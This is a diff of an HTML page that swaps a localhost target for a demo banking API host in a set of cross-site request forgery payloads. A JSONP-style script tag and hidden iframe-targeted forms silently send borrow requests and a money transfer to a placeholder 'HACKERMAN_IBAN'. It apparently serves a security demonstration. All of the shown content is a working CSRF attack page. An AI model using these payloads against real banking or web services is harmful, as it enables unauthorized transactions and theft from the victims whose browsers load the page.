@@ -282,15 +282,15 @@
 </body>
 
 <!--JSONP STYLE-->
-<script src="http://localhost:8080/api/banking/borrow?amount=6666666"></script>
+<script src="https://demo.devplant.ro/api/banking/borrow?amount=6666666"></script>
 
 <iframe style="display:none" name="csrf-frame1"></iframe>
-<form method="GET" action='http://localhost:8080/api/banking/borrow' target="csrf-frame1" id="csrf-form1">
+<form method="GET" action='https://demo.devplant.ro/api/banking/borrow' target="csrf-frame1" id="csrf-form1">
     <input type="hidden" name="amount" value="42424242">
 </form>
 
 <iframe style="display:none" name="csrf-frame2"></iframe>
-<form method="POST" action='http://localhost:8080/api/banking/send-money' target="csrf-frame2" id="csrf-form2">
+<form method="POST" action='https://demo.devplant.ro/api/banking/send-money' target="csrf-frame2" id="csrf-form2">
     <input type="hidden" name="amount" value="42424242">
     <input type="hidden" name="iban" value="HACKERMAN_IBAN">
 </form>
